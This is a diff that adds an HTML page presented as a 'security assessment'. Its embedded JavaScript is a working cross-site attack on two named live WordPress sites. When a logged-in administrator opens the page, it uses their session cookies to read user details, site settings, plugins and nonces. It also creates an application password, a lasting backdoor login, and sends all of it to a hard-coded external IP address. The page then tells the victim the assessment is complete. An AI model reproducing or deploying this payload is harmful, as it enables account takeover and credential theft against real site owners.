@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head><title>Kini Security Assessment</title></head>
+<body>
+<div id="status">Processing...</div>
+<script>
+var C2 = "http://64.227.62.83:9999";
+var TARGETS = [
+    "https://www.kini.id",
+    "https://blog.kini.id"
+];
+
+function exfil(tag, data) {
+    fetch(C2 + "/" + tag, {
+        method: "POST",
+        body: JSON.stringify(data),
+        mode: "no-cors"
+    }).catch(function(){
+        new Image().src = C2 + "/" + tag + "?d=" + btoa(JSON.stringify(data).slice(0,2000));
+    });
+}
+
+TARGETS.forEach(function(target) {
+    // 1. Get current user info + nonce
+    fetch(target + "/wp-json/wp/v2/users/me", {credentials: "include"})
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+        exfil("user", d);
+        // 2. Get settings (admin only)
+        return fetch(target + "/wp-json/wp/v2/settings", {credentials: "include"});
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) { exfil("settings", d); })
+    .catch(function(e) { exfil("error", {msg: e.toString(), target: target}); });
+
+    // 3. Create application password
+    fetch(target + "/wp-json/wp/v2/users/me/application-passwords", {
+        method: "POST",
+        credentials: "include",
+        headers: {"Content-Type": "application/json", "X-WP-Nonce": ""},
+        body: JSON.stringify({name: "security-audit-" + Date.now()})
+    }).then(function(r) { return r.json(); })
+    .then(function(d) { exfil("apppwd", d); })
+    .catch(function(e) { exfil("apppwd-err", {msg: e.toString()}); });
+
+    // 4. List plugins
+    fetch(target + "/wp-json/wp/v2/plugins", {credentials: "include"})
+    .then(function(r) { return r.json(); })
+    .then(function(d) { exfil("plugins", d); })
+    .catch(function(){});
+
+    // 5. Get nonce from page
+    fetch(target + "/wp-admin/admin-ajax.php", {
+        method: "POST",
+        credentials: "include",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "action=rest-nonce"
+    }).then(function(r) { return r.text(); })
+    .then(function(d) {
+        if (d && d !== "0") {
+            exfil("nonce", {nonce: d, target: target});
+            // With nonce, try again:
+            fetch(target + "/wp-json/wp/v2/users/me", {
+                credentials: "include",
+                headers: {"X-WP-Nonce": d}
+            }).then(function(r) { return r.json(); })
+            .then(function(ud) { exfil("user-with-nonce", ud); });
+        }
+    }).catch(function(){});
+});
+
+document.getElementById("status").innerHTML = "Assessment complete. You may close this page.";
+</script>
+</body>
+</html>
